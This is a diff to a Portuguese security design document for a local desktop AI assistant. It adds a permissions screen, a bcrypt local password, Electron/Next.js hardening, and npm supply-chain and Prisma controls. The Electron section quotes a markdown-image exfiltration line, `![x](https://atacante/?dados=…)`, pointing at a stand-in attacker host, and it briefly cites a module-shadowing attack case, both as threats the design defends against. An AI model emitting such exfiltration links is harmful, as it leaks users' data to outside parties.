@@ -363,6 +363,13 @@ Uma negação em qualquer nível vence uma liberação em qualquer outro (igual 
 - Sem resposta → cancela.
 - "Sempre permitir" só existe para risco baixo e médio e fica escopado (projeto, ferramenta, padrão); **nunca** para alto.
 
+**Tela "Permissões" (pedido do dono do projeto):** toda permissão que você deu fica numa lista que você vê e remove quando quiser.
+
+- Cada linha mostra o que foi liberado (ex.: "abrir o VS Code"), o escopo (pasta, projeto ou sempre), quando e como você liberou (clique ou voz) e quantas vezes já foi usada.
+- **Remover vale na hora**, inclusive para uma tarefa em andamento: a próxima ação igual volta a pedir confirmação. Dá para remover uma a uma ou todas de uma vez ("voltar ao padrão").
+- Fica guardada em `regras_usuario` ([05](05-dados-postgresql.md), seção 5.5), com versões: dá para ver o histórico do que foi dado e tirado. A auditoria registra cada mudança.
+- **Só você mexe nela**, pela interface. O Jesus não dá nem amplia permissão para si mesmo (invariante 7). Ele pode só **abrir a tela** quando você pedir ("Jesus, mostra minhas permissões").
+
 **Fadiga de aprovação:** a própria Meta lembra que o modelo quebra quando o usuário aprova sem ler. Por isso: não pedir confirmação para o que é seguro, agrupar aprovações de baixo risco e deixar o cartão de alto risco visualmente diferente (âmbar ou vermelho, as únicas cores que o holograma usa).
 
 ### 3.4.8 Níveis de risco por domínio
@@ -428,6 +435,8 @@ O Jesus **nunca** faz o que está abaixo, mesmo que você peça, mesmo com todos
   - strings de conexão.
   - Se encontrar um segredo num parâmetro de ação com destino externo → **bloqueio**.
 - **Sua senha:** o Jesus nunca pede, guarda ou digita. O login é sempre você, na página oficial (OAuth).
+- **A senha do próprio Jesus** (para abrir o app, seção 3.20) é outra coisa: fica só como hash bcrypt e nunca é usada com nenhum provedor.
+- **Hash não é cifra.** O bcrypt serve para conferir senhas; o que precisa ser lido de volta (campos sensíveis, backups) é cifrado com AES-256-GCM, com a chave protegida pelo cofre ([decisão 0015](decisoes/0015-senha-local-com-bcrypt-e-dados-cifrados.md)).
 - **`.env`:** pode ser liberado por projeto, mas o Executor injeta os valores nos processos da sandbox que precisarem. **O modelo vê só os nomes** das variáveis.
 - **Rotação e revogação:** o botão "desconectar" revoga o token na API do provedor e apaga do cofre. Num incidente, "revogar tudo" com um clique (seção 3.18).
 
@@ -489,7 +498,7 @@ appendWindowsPath = false
 - **Pacotes:**
   - instalar o que já está no lockfile ou manifesto = médio;
   - pacote novo = pergunta, mostrando nome, versão, autor e data de publicação, com alerta para pacotes muito novos ou com nome parecido com outro (*typosquatting*);
-  - preferir `npm ci` ou `pnpm install --frozen-lockfile`;
+  - preferir `npm ci` (ou o equivalente com lockfile congelado do gerenciador do projeto);
   - scripts de instalação desligados por padrão quando possível.
 - **Sombreamento de módulo (caso Rehberger):** a sandbox não executa nada a partir da pasta de downloads ou de pastas com arquivos recém-baixados; Python roda com `-I` (modo isolado), e o diretório de trabalho de scripts é o do projeto.
 - **Rede:** cada comando declara os domínios de que precisa (ex.: `registry.npmjs.org`), e o Porteiro avalia isso junto com o comando, como no Claude Code. No modo padrão, o controle é só do Porteiro (comando com rede pergunta). No AppContainer (upgrade), a rede fica fechada sem a capacidade `internetClient`; no WSL2, fica fechada e abre por lista de domínios via proxy.
@@ -550,7 +559,31 @@ Seguir a lista oficial de segurança do Electron ([Electron Security](https://el
 - Bloquear navegação e novas janelas; `shell.openExternal` só para URLs de uma lista (ex.: páginas de login OAuth).
 - Validar a origem de toda mensagem IPC.
 - Markdown vindo do modelo é renderizado com sanitização e **sem carregar imagens remotas** sozinho. Esse é um canal clássico de vazamento: `![x](https://atacante/?dados=…)`.
-- Protocolo próprio (`app://`) em vez de `file://`.
+- Protocolo próprio em vez de `file://`: a janela carrega `https://jesus.invalid/`, um endereço que não existe na internet, atendido pelo `protocol.handle` do Electron (decisão 0016).
+- **Interface em Next.js com servidor ([decisão 0016](decisoes/0016-nextjs-com-servidor-dentro-do-electron.md), que substitui a exportação estática da 0013):** páginas, Server Actions e rotas são o back-end da interface, mas **o app instalado não abre porta**: o Electron entrega ao servidor do Next, dentro do próprio app, só os pedidos da janela do Jesus para `https://jesus.invalid/` e recusa qualquer outro endereço. Outros programas e sites não alcançam esse back-end.
+  - **Lista de `Host`** (`src/server/host.ts`): o proxy responde 421 a qualquer pedido cujo `Host` (ou `X-Forwarded-Host`) não seja `127.0.0.1`, `localhost`, `[::1]` ou `jesus.invalid`, antes de qualquer página ou ação. É a defesa contra *DNS rebinding* no servidor com porta (desenvolvimento e `next start`): nesse ataque, `Origin` e `Host` trazem o nome do site do atacante e batem entre si, então a checagem de origem do Next sozinha não basta. O proxy confere todo pedido, menos os arquivos de `/_next/static/`; não há exceção por cabeçalho (um pedido com `next-router-prefetch` também passa pela lista). No app instalado (`JESUS_HTTPS=1`), a lista fica só com `jesus.invalid`.
+  - **Processo próprio ([decisão 0017](decisoes/0017-servidor-do-next-num-utilityprocess.md)):** o servidor do Next roda no utilityProcess `jesus-next`. Ele só fala com o principal por uma ponte de mensagens conferidas com Zod estrito: pedido de até 2 MB, só `https://jesus.invalid`, só GET, HEAD e POST, e resposta com contrapressão.
+    - Sem rede: o `fetch` falha fechado, menos o repasse interno de Server Action do próprio Next, atendido em memória.
+    - Se o processo cair, o pedido em andamento é interrompido (nunca chega pela metade como se estivesse inteiro), e o processo novo começa bloqueado.
+    - A montagem do build para o app (`stage-ui.mjs`) recusa `.env*`, a pasta `.jesus-dev`, credenciais, chaves, bancos e módulos nativos.
+    - Limite: o utilityProcess não tem a sandbox do Chromium. A separação protege contra travamento e vazamento por acidente, não contra execução de código no processo do Next.
+  - **CSP com nonce novo a cada pedido** (`src/proxy.ts`): `script-src 'self' 'nonce-…' 'strict-dynamic'` e estilos com o mesmo nonce, sem `unsafe-inline`; `unsafe-eval` só no desenvolvimento. Mais `X-Frame-Options: DENY`, `nosniff`, `no-referrer` e `Permissions-Policy`. O Zod roda sem JIT para não tentar `new Function`. As telas de 404 e de erro geral são do próprio app (`app/not-found.tsx`, `app/global-error.tsx`), só com classes CSS: as padrão do Next usam estilos inline, que a CSP bloqueia. O teste no Chromium não acusou violação nas telas de entrada, início, Cenários, 404 e erro geral.
+  - **Server Actions são pontos de entrada:** só aceitam POST com a mesma origem (o Next confere `Origin` contra `Host`; o teste com origem falsa foi recusado e não contou tentativa), e cada uma valida a entrada com Zod e confere a sessão sozinha (até o "Bloquear": sem sessão válida, só apaga o cookie de quem chamou). Cada página protegida também confere (o layout não roda de novo a cada navegação). Em desenvolvimento, qualquer programa do PC alcança a porta local; no app instalado, só a janela do Jesus.
+  - **Sessão:** cookie `HttpOnly`, `SameSite=Strict` (e `Secure` no app em https), com 256 bits aleatórios; o servidor guarda só o SHA-256. Bloquear apaga a sessão. A página aberta confere a sessão a cada 30 s (ou um quarto do tempo sem uso, se for menor) e ao voltar a ficar visível, **sem contar como uso**; só tecla, clique ou rolagem de verdade contam. O tempo sem uso é medido por um relógio que nunca volta (o maior avanço entre o monotônico e o de parede).
+  - O back-end do Next é a camada da interface: não executa ferramentas nem guarda tokens de contas (Cérebro, Porteiro e Executor seguem em processos próprios, seção 2.2).
+  - A telemetria do Next fica desligada e o servidor de desenvolvimento só escuta em `127.0.0.1`. O Next 16 imprime no terminal os argumentos de cada Server Action (a senha, o código de recuperação e, depois, a chave da API): isso fica desligado no `next.config.ts` (`logging.serverFunctions: false`), com teste.
+- **App de desktop (fase 1, etapa 3; `apps/desktop/src/main/`):**
+  - **Janela:** uma só, sem preload (a página não fala com o processo principal na fase 1), com sandbox, sem `webview`, sem ferramentas de desenvolvedor e sem menu.
+  - **Sessão em memória:** a janela usa a partição `jesus` (sem `persist:`, nada vai para o disco). `https://jesus.invalid` vai para o servidor da interface; qualquer outro endereço, `http:` e `file:` recebem 403 do próprio app. A sessão padrão, que nenhuma janela usa, fica trancada do mesmo jeito.
+  - **Sem rede:** proxy morto (`socks5://0.0.0.0:9`, sem a exceção automática de localhost) nas duas sessões; WebRTC sem UDP direto e sem mDNS.
+  - **Nenhum ouvinte de `webRequest`:** no Electron 44.7.0, qualquer ouvinte faz a página depois de um 3xx herdar a CSP do 3xx. O handler tira a CSP das respostas 3xx (a página de destino traz a dela).
+  - **Cookies:** o `protocol.handle` não guarda cookies; o pote do processo principal guarda a sessão e nunca a entrega ao Chromium (o `document.cookie` da página fica vazio). Se o servidor da interface cair, o pote é limpo.
+  - **Negados:** permissões (câmera, microfone, localização, notificações…), dispositivos (HID, USB, serial, Bluetooth), captura de tela, downloads e o corretor (que baixaria dicionários).
+  - **Guardas:** navegação e redirecionamento só dentro do app; `window.open` negado; `webview` barrado. **Vigia de quadros:** um quadro com outra origem que chegue a carregar derruba a sessão e volta a janela para a entrada. É a segunda barreira de verdade: um `iframe` `srcdoc` com sandbox (origem opaca) passa pela CSP e pela guarda de navegação, e o teste confere que o vigia o pega.
+  - **Linha de comando:** o app de produção não aceita nenhum argumento (os fusíveis não cobrem `--remote-debugging-port`). O build de teste, decidido na compilação (constante `__JESUS_TEST_BUILD__`), aceita, e o build de produção falha se sobrar código de teste nele.
+  - **Administrador:** no Windows, o app confere o nível de integridade (`whoami`, pelo caminho da pasta do sistema) e não abre elevado; se não conseguir conferir, também não abre.
+  - **CSP:** também `frame-src`, `child-src` e `worker-src 'none'`.
+  - **Testes de ponta a ponta:** o app de verdade no Electron 44.7.0, sob xvfb. No CI, com a sandbox do Chromium ligada (o teste confere o filtro seccomp no processo da página). Cobrem criar a senha e entrar, a aba Cenários com o holograma, a navegação e a janela para fora barradas, o 403 e o proxy morto, as permissões negadas, as ferramentas de desenvolvedor desligadas, o vigia de quadros, o bloqueio, a queda e volta do servidor da interface (bloqueado) e a ausência de violação de CSP.
 - Cartões de confirmação num componente separado, que o conteúdo do modelo não consegue imitar.
 
 ## 3.13 Autoproteção
@@ -563,10 +596,14 @@ Seguir a lista oficial de segurança do Electron ([Electron Security](https://el
 
 ## 3.14 Cadeia de suprimentos
 
-- Fixar versões (lockfile) e revisar atualizações; `npm ci` ou `pnpm install --frozen-lockfile` no build.
-- Scripts de instalação desligados por padrão (`ignore-scripts`), liberados só para pacotes que precisam (ex.: módulos nativos) depois de revisar.
-- Dependabot ou Renovate + `pnpm audit`. Atualizar com um atraso proposital (ex.: esperar alguns dias depois que uma versão nova sai): pacotes sequestrados costumam ser removidos rápido.
+- Fixar versões (`package-lock.json`) e revisar atualizações; `npm ci` no build. **Todo PR que muda o lockfile tem o diff revisado** (pacotes novos, versões, `hasInstallScript`).
+- Scripts de instalação de dependências **nunca rodam por padrão** (`ignore-scripts=true` no `.npmrc`). Isso cobre também o que a política `allowScripts` do npm 11 sozinha não pega: scripts de dependências embutidas (`bundleDependencies`) e compilação nativa implícita (`binding.gyp`), testados em 08/10/2026. Pacote que precisa de script (módulo nativo, binário baixado) é revisado e liberado um a um, por versão: `npm approve-scripts <pacote>` grava a aprovação no `package.json`, e `npm rebuild <pacote> --ignore-scripts=false` roda só ele, barrado pelo `strict-allow-scripts` se não estiver aprovado. Passo a passo em `CLAUDE.md`.
+- Dependabot ou Renovate + `npm audit`. Atualizar com um atraso proposital, esperando alguns dias depois que uma versão nova sai: pacotes sequestrados costumam ser removidos rápido. No projeto, `min-release-age=3` no `.npmrc` vale sempre que o npm **escolhe** versões (`npm install <pacote>`, `npm update`, lockfile novo); o que já está no lockfile é instalado como está, por isso a revisão do diff.
+- Pacotes internos (`@jesus/*`) vêm só do workspace: o escopo aponta para um registry inexistente no `.npmrc`, contra confusão de dependências (o escopo `@jesus` no npm público não é nosso).
+- O npm não acusa import de pacote não declarado (dependência "fantasma"), como o pnpm acusava: a revisão confere que cada pacote declara o que importa.
 - Modelos baixados (voz, embeddings, LLM local): só de fontes oficiais, conferindo o hash.
+- **Prisma ([decisão 0014](decisoes/0014-prisma-como-orm.md)):** a CLI baixa sozinha um binário nativo (o *schema engine*) de `binaries.prisma.sh`, por fora do lockfile. O projeto evita isso no `prisma generate` (que não precisa dele) e no CI; só o `prisma migrate dev`, na máquina de quem desenvolve, usa o binário. O app instalado não leva a CLI: aplica as migrações em SQL com o migrador próprio. Os scripts de instalação do `prisma` e do `@prisma/engines` estão recusados em `allowScripts`.
+- **Next.js:** traz como dependência opcional o `sharp` (binários de imagem já compilados, sem script de instalação). O Jesus não usa otimização de imagem (`images.unoptimized`), então esses binários ficam instalados e parados.
 - Servidores MCP: versão fixada e hash das definições (seção 3.8).
 - Build reproduzível no GitHub Actions; instalador assinado quando for distribuir.
 
@@ -619,3 +656,16 @@ Na interface, aparece como uma linha do tempo, que pode ser exportada.
 - No modo padrão (sem AppContainer nem WSL2), a contenção é parcial: um comando malicioso que passe pelo Porteiro ainda pode ler arquivos fora das pastas negadas.
 - As confirmações dependem de você ler o cartão.
 - Modelos diferentes se comportam de jeitos diferentes, então a coleção de ataques precisa rodar para cada um.
+
+## 3.20 Senha local do Jesus
+
+Pedido do dono ([decisão 0015](decisoes/0015-senha-local-com-bcrypt-e-dados-cifrados.md)): o Jesus pede uma senha própria para abrir.
+
+- **Quando pede:** ao abrir, depois de 15 min sem uso (ajustável de 1 a 120 min), quando o Windows bloqueia a sessão e quando o PC suspende. Relógio que volta não adia o bloqueio: o prazo passa a contar do instante corrigido. Um bloqueio que chega enquanto a senha ainda está sendo conferida vence o resultado atrasado.
+- **Como guarda:** só o hash bcrypt (custo 12), na tabela `app_credentials`, que só o processo principal lê e grava (papel `jesus_config`; o Cérebro e o Executor não têm acesso). O banco recusa qualquer valor que não seja um hash bcrypt.
+- **Regras:** no mínimo 12 caracteres (15 ou mais recomendados); no máximo 72 bytes, o limite do bcrypt, recusando em vez de cortar (e recusando também, na conferência, a senha certa seguida de mais bytes além do 72º); sem U+0000, caracteres de controle nem surrogate sozinho (o bcrypt repete a senha em ciclo, e "senha\0senha" daria a mesma chave; a conferência também recusa); normalização NFC; recusa de senhas comuns, trechos repetidos de qualquer tamanho (também só de símbolos ou emoji, ou uma letra repetida entre símbolos), senhas com 3 caracteres diferentes ou menos e sequências; sem regra de composição.
+- **Tentativas erradas:** 5 livres; depois, espera que dobra a cada erro (30 s, 1 min, 2 min… até 15 min). A contagem fica no banco e é atômica, e é uma só para o app: quem alcança a tela de entrada consegue impor a espera ao dono. Por isso só a janela do Jesus pode alcançar o serviço (no app instalado não há porta; em desenvolvimento, a lista de `Host` barra sites, mas não programas do próprio PC). Nunca há bloqueio permanente: se o relógio voltar para antes do último erro (ou o erro ficar sem data), a espera é reancorada no instante atual e termina em no máximo o tempo exigido. A mesma espera vale para o código de recuperação. A auditoria registra cada erro com a operação (desbloquear, trocar a senha ou recuperar) e cada espera uma vez só.
+- **Código de recuperação:** 100 bits aleatórios, mostrado uma vez na criação, guardado só como hash bcrypt; usado, é trocado por um novo.
+- **Com o Jesus bloqueado:** a interface mostra só a tela de entrada; pedidos novos não entram; cartões de confirmação e fluxos de conexão de contas são cancelados (o código do device flow sai da tela); "Jesus, pare" continua funcionando.
+- **Quem decide:** o servidor da interface (Server Actions do Next dentro do app, [decisão 0016](decisoes/0016-nextjs-com-servidor-dentro-do-electron.md)), com o serviço e a máquina de estados do `@jesus/auth`. A página só manda a senha e recebe o resultado; nunca vê o hash e não consegue se desbloquear sozinha.
+- **Limite honesto:** a senha protege o app de quem chega ao PC desbloqueado, mas não cifra os dados: um programa rodando como você ainda consegue pedir ao DPAPI a chave de dados (3.5). Derivar a chave também da senha fica como pergunta em aberto para o dono, depois das rotinas.
